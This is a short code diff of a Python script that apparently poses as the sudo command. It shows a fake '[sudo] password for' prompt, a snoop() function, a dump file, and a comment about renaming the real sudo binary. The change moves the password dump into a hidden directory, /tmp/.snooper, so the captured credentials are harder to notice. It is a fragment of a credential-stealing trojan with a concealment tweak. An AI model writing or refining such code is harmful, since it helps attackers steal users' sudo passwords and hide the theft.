@@ -6,8 +6,8 @@ import getpass
 command = ' '.join(map(str, sys.argv[1:]))
 username = getpass.getuser()
 prompt = "[sudo] password for {0}: ".format(username)
-dumpdir = "/tmp/snooper" # change this
-dumpfile = "/tmp/snooper/dump.txt" # change this
+dumpdir = "/tmp/.snooper" # change this
+dumpfile = "/tmp/.snooper/dump.txt" # change this
 sudo = 'sudo' # change this to the the new name of the sudo binary
 
 def snoop():
